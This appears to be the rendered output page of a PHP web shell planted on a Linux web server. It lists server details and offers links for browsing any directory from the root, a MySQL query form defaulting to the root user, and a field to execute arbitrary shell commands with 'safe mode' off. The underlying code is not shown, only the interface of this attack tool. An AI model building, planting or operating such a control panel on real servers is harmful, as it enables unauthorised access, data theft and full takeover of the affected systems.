<b>Server Information:</b><br />
<i>
Operating System: Linux<br />
PHP Version: 7.4.33<br />
<a href="?phpinfo=true">View phpinfo</a>
</i>
<br />
<br />
<b>Directory Traversal</b><br />
<a href="?d=/var/www/html"><b>Go to current working directory</b></a> <br />
<a href="?d=/"><b>Go to root directory</b></a> <br />
<b>Go to any directory:</b> <form action="" method="GET"><input type="text" name="d" value="/" /><input type="submit" value="Go" /></form>



<hr>Execute MySQL Query:
<form action="" METHOD="GET" >
<table>
<tr><td>host</td><td><input type="text" name="host"value="localhost"> </td></tr>
<tr><td>user</td><td><input type="text" name="usr" value="root"> </td></tr>
<tr><td>password</td><td><input type="text" name="passwd"> </td></tr>
<tr><td>database</td><td><input type="text" name="db"> </td></tr>
<tr><td valign="top">query</td><td><textarea name="mquery" rows="6" cols="65"></textarea> </td></tr>
<tr><td colspan="2"><input type="submit" value="execute"></td></tr>
</table>
</form>
<hr>
<pre><form action="" METHOD="GET" >Execute Shell Command (safe mode is off): <input type="text" name="c"><input type="submit" value="Go"></form> 
